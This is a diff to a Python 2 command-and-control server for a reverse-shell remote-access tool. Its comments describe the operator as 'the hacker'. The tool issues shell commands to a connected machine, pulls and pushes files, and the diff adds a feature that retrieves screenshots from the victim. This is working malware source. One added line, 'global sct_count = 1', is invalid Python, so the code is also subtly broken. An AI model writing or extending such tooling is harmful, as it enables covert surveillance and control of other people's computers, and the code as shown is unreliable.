@@ -19,6 +19,7 @@ def reliable_recv():
 			continue
 
 def shell():
+	global sct_count = 1
 	while True:
 		# Inputting the command from the hacker.
 		command = raw_input("* Shell#~%s: " %str(ip))
@@ -35,6 +36,7 @@ def shell():
 			result = reliable_recv()
 			# Use base64 encoding and decoding.
 			file.write(base64.b64decode(result))
+			file.close()
 		elif command[0:6] == 'upload':
 			try:
 				file = open(command[7:], "rb")
@@ -42,6 +44,15 @@ def shell():
 			except:
 				failed = "Upload failed!"
 				reliable_send(base64.b64encode(failed))
+		elif command[0:10] == 'screenshot':
+			sct = open("screenshot%d" %sct_count, "wb")
+			image = reliable_recv()
+			image_decoded = base64.b64decode(image)
+			if image_decoded[:3] == '[!]':
+				print image_decoded
+			else:
+				sct.write(image_decoded)
+				sct_count += 1
 		else:
 			# Receiving the info from client (no of bytes)
 			output = reliable_recv()
@@ -53,7 +64,7 @@ def server():
 
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Options for the socket.
 
-	s.bind(("10.0.2.15", 42069)) # Binding the socket to an IP address and a port
+	s.bind(("127.0.0.1", 42069)) # Binding the socket to an IP address and a port
 
 	s.listen(5) # Means that it will listen for 5 connections
 	print "Listening for incoming connections"
